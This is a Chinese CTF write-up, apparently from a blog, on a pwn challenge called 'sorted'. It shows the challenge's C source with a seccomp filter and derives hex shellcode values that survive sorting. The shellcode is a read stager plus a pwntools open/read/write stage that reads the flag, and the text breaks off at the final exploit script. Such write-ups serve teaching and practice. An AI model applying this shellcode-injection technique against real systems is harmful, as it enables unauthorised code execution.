            "content_html": "<p>题目文件: 本链接+.&#x2F;sorted  .&#x2F;ezpwn</p>\n<p>总结下来就是基础太不牢固了，很多小点都不清楚，浪费时间，每次遇到后都要尽量及时解决，查缺补漏。</p>\n<h1 id=\"sorted\"><a href=\"#sorted\" class=\"headerlink\" title=\"sorted\"></a>sorted</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *dest; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sandbox();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Just give you ten seconds before you DIE!&quot;</span>);</span><br><span class=\"line\">  dest = mmap(<span class=\"number\">0LL</span>, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">10</span>; i &gt; <span class=\"number\">0</span>; --i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d!\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;DIEnum[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Before you die,I must do something.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::sort&lt;<span class=\"type\">int</span> *&gt;(&amp;unk_203044, &amp;unk_20306C);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;let&#x27;s see what&#x27;U have said&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">10</span>; ++j )</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, DIEnum[j]);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hahahahahaha!Now,taste the fear&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, DIEnum, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (*)(<span class=\"type\">void</span>))dest)();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/seccomp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/filter.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> DIEnum[<span class=\"number\">20</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sandbox</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_filter</span> <span class=\"title\">filter</span>[] =</span> &#123;</span><br><span class=\"line\">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class=\"number\">4</span>),</span><br><span class=\"line\">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class=\"number\">0xc000003e</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>),</span><br><span class=\"line\">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class=\"number\">0</span>),</span><br><span class=\"line\">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class=\"number\">59</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>),</span><br><span class=\"line\">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class=\"line\">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_fprog</span> <span class=\"title\">prog</span> =</span> &#123;</span><br><span class=\"line\">    .len = (<span class=\"type\">unsigned</span> <span class=\"type\">short</span>)(<span class=\"keyword\">sizeof</span>(filter)/<span class=\"keyword\">sizeof</span>(filter[<span class=\"number\">0</span>])),</span><br><span class=\"line\">    .filter = filter,</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    prctl(PR_SET_NO_NEW_PRIVS,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  sandbox();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Just give you ten seconds before you DIE!&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span>* v1=(<span class=\"type\">char</span> *)mmap(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>,<span class=\"number\">7</span>,<span class=\"number\">34</span>,<span class=\"number\">-1</span>,<span class=\"number\">0ll</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">10</span>;i&gt;=<span class=\"number\">1</span>;--i)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d!\\n&quot;</span>,i);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;DIEnum[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Before you die,I must do something.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::sort(DIEnum+<span class=\"number\">1</span>,DIEnum+<span class=\"number\">11</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;let&#x27;s see what&#x27;U have said&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=<span class=\"number\">10</span>;++i)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,DIEnum[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hahahahahaha!Now,taste the fear&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(v1,DIEnum,<span class=\"number\">0x100</span>);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (*) (<span class=\"type\">void</span>)) v1)();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>​\t\t打眼一看就发现是一个排序，但是由于自己对端续、有符号数、内存值等一些概念不清楚、晕乎了很常见。</p>\n<p>​\t\t首先这道题并不是要找一个最小化的shellcode，直接拿shell（应该是可以绕过的把，），<strong>因为排序的因素，直接拿shell排序会比较难，不如先read进来，没限制了，再干其他的。</strong></p>\n<h3 id=\"沙箱\"><a href=\"#沙箱\" class=\"headerlink\" title=\"沙箱\"></a>沙箱</h3><p>​\t有沙箱保护 seccomp-tools dump .&#x2F;rop</p>\n<p>execve类似的还有吧    execveat</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x02</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) <span class=\"keyword\">goto</span> <span class=\"number\">0004</span></span><br><span class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x0000003b</span>  <span class=\"keyword\">if</span> (A != execve) <span class=\"keyword\">goto</span> <span class=\"number\">0005</span></span><br><span class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br><span class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p> if (A &gt;&#x3D; 0x40000000) goto 0006 没有这个哦</p>\n<p><a href=\"https://www.anquanke.com/post/id/219077\">https://www.anquanke.com/post/id/219077</a></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/image-20231028123924865.png\" alt=\"image-20231028123924865\" style=\"zoom:50%;\">\n\n\n\n\n\n<p><a href=\"http://shell-storm.org/shellcode/files/shellcode-905.html\">http://shell-storm.org/shellcode/files/shellcode-905.html</a></p>\n<p>​\t这里有一个比较短的execveat的shellcode，<font color=\"red\">但是，仍然比较难排序，因为指令太多了，而且有个长指令必须连起来</font></p>\n<p>如果不绕过的话就 orw了</p>\n<h3 id=\"对-void-void-dest-的理解\"><a href=\"#对-void-void-dest-的理解\" class=\"headerlink\" title=\"对 ((void (*)(void))dest)()的理解\"></a>对 ((void (*)(void))dest)()的理解</h3><p>dest怎么理解呢，（还好要到了原题，不然。。也可以自己再写一遍的。。都问题不大，多动手！）</p>\n<p>​\t其实就是存放的shellcode的地址，然后当成函数，直接调用这个位置的指令，（就是函数指针）</p>\n<p>​\t((void (*)(void))dest)() ， 将dest转换为一个函数指针 ，函数不带参数，且无返回值</p>\n<p>call  rax, 然后就可以执行shellcode吗</p>\n<p>​\trax里存放的是shellcode那里的起始地址，<strong>也就是将要执行的指令的地址</strong>，call会做两件事，一件是把当前的下一条指令压栈，另外一件是把rax指向的地址赋值给rip（类似于jmp）</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>​\t长度还有限制，<strong>所以应该是先通过一个read片段，把后续代码读入mmap的空间（不会受排序影响），然后再跳转过去即可。</strong></p>\n<p>​\t<font color=\"red\">注意可以利用的信息,rdi存储着mmap的地址,可以利用</font></p>\n<p>​\t这里有个细节，读入的地址不要和要执行的jmp重合， 很容易覆盖到jmp那里,影响指令，所以需要往后写，比如rdi+0x100</p>\n<h3 id=\"shellcode-排序\"><a href=\"#shellcode-排序\" class=\"headerlink\" title=\"shellcode 排序\"></a>shellcode 排序</h3><p>64位系统调用规则: rax是系统调用号，参数和函数的一样，rdi、rsi、rdx。。</p>\n<p>00也会被解释的，所以需要补齐，用0x90 nop  0xfc cld这种指令,并且可以利用他们来调整顺序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read(<span class=\"number\">0</span>,buf,<span class=\"number\">0x100</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">8b</span> df        mov rbx,rdi <span class=\"comment\">//把要写的地址传给rbx（因为rbx在其他地方用不到）</span></span><br><span class=\"line\"><span class=\"number\">31</span> d2           xor edx,edx <span class=\"comment\">//为什么不是rdx呢</span></span><br><span class=\"line\">b6 <span class=\"number\">01</span>           mov dh,<span class=\"number\">0x1</span>   <span class=\"comment\">//一方面设置第三个参数 0x100，也就是read的大小，</span></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">01</span> d3        add rbx,rdx <span class=\"comment\">//另一方面可以让rbx+0x100，</span></span><br><span class=\"line\"><span class=\"number\">31</span> C0           xor eax,eax  <span class=\"comment\">//为什么不是rax,  read系统调用号是0</span></span><br><span class=\"line\"><span class=\"number\">31</span> ff           xor edi,edi  <span class=\"comment\">// 第一个参数0 ，标准输入</span></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">89</span> de        mov rsi,rbx <span class=\"comment\">//第二个参数，buf地址</span></span><br><span class=\"line\"><span class=\"number\">0f</span> <span class=\"number\">05</span>           syscall</span><br><span class=\"line\">ff e6           jmp rbx <span class=\"comment\">//跳转到后续shellcode地址</span></span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">所以问什么不</span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">89</span> fe        mov rsi,rdi <span class=\"comment\">//把要写的地址传给rbx（因为rbx在其他地方用不到）</span></span><br><span class=\"line\"><span class=\"number\">31</span> d2           xor edx,edx</span><br><span class=\"line\">b6 <span class=\"number\">01</span> \t \t\tmov dh,<span class=\"number\">0x1</span>   <span class=\"comment\">//一方面设置rdx为0x100，也就是read的大小，</span></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">01</span> d6\t\tadd rsi,rdx <span class=\"comment\">//另一方面可以让rbx+0x100，</span></span><br><span class=\"line\"><span class=\"number\">31</span> C0           xor eax,eax  </span><br><span class=\"line\"><span class=\"number\">31</span> ff           xor edi,edi  <span class=\"comment\">// 第一个参数0 ，标准输入</span></span><br><span class=\"line\"><span class=\"number\">0f</span> <span class=\"number\">05</span>           syscall</span><br><span class=\"line\">ff e6           jmp rsi <span class=\"comment\">//跳转到后续shellcode地址</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">注意字节序是反的</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0xfe8948</span></span><br><span class=\"line\"><span class=\"number\">0xd231</span></span><br><span class=\"line\"><span class=\"number\">0x01b6</span></span><br><span class=\"line\"><span class=\"number\">0xd60148</span></span><br><span class=\"line\"><span class=\"number\">0xc031</span></span><br><span class=\"line\"><span class=\"number\">0xff31</span></span><br><span class=\"line\"><span class=\"number\">0x050f</span></span><br><span class=\"line\"><span class=\"number\">0xe6ff</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">排序有几个注意点</span><br><span class=\"line\"><span class=\"number\">1.</span>负数是自身绝对值越大， 数值越大吗。。(是的把，按位取反加<span class=\"number\">1</span>，看起来越大的值，补码越小，再加符号，越大，)（有空再看看。。</span><br><span class=\"line\"><span class=\"number\">2.</span>谁必须在谁前面  一个<span class=\"number\">90</span>，一个fc就可以保证了</span><br><span class=\"line\"><span class=\"number\">3.</span>syscall和jmp rsi必须在最后（fcfc就可以保证了，其他的最大fc90）</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0x90fe8948</span></span><br><span class=\"line\"><span class=\"number\">0x9090d231</span></span><br><span class=\"line\"><span class=\"number\">0x90fc01b6</span></span><br><span class=\"line\"><span class=\"number\">0xfcd60148</span></span><br><span class=\"line\"><span class=\"number\">0xfc90c031</span></span><br><span class=\"line\"><span class=\"number\">0xfc90ff31</span></span><br><span class=\"line\"><span class=\"number\">0xfcfc050f</span></span><br><span class=\"line\"><span class=\"number\">0xfcfce6ff</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffff</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffff</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">-1869557199</span> <span class=\"number\">-1862532682</span> <span class=\"number\">-1862366904</span> <span class=\"number\">-57622479</span> <span class=\"number\">-57606351</span> <span class=\"number\">-53083832</span> <span class=\"number\">-50592497</span> <span class=\"number\">-50534657</span> <span class=\"number\">2147483647</span> <span class=\"number\">2147483647</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>同学的:</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/image-20231029143618124.png\" alt=\"image-20231029143618124\" style=\"zoom:50%;\">\n\n\n\n<p>写一个脚本辅助生成(其实就是模拟题目)   <font color=\"red\">这里是不是可以用cap那个工具 显示指令(埋个坑吧)、以及连起来更多的,一键生成exp</font></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> DIEnum[<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;10&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span>* v1=(<span class=\"type\">char</span> *)<span class=\"built_in\">mmap</span>(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>,<span class=\"number\">7</span>,<span class=\"number\">34</span>,<span class=\"number\">-1</span>,<span class=\"number\">0ll</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%x&quot;</span>,&amp;DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;未排序前结果：\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::<span class=\"built_in\">sort</span>(DIEnum,DIEnum+<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;排序后结果：\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;0x%-16x          %d\\n&quot;</span>,DIEnum[i],DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入的值：\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"二段shellcode\"><a href=\"#二段shellcode\" class=\"headerlink\" title=\"二段shellcode\"></a>二段shellcode</h3><p>这里应该就随意了,生成一个orw的就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置目标架构为x86-64</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 默认的是大端序，可以修改</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./flag&quot;</span>)</span><br><span class=\"line\">shellcode += shellcraft.read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\">shellcode += shellcraft.write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(asm(shellcode))</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"最终exp\"><a href=\"#最终exp\" class=\"headerlink\" title=\"最终exp\"></a>最终exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># 设置目标架构为x86-64</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 默认的是大端序，可以修改</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./sorted&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span 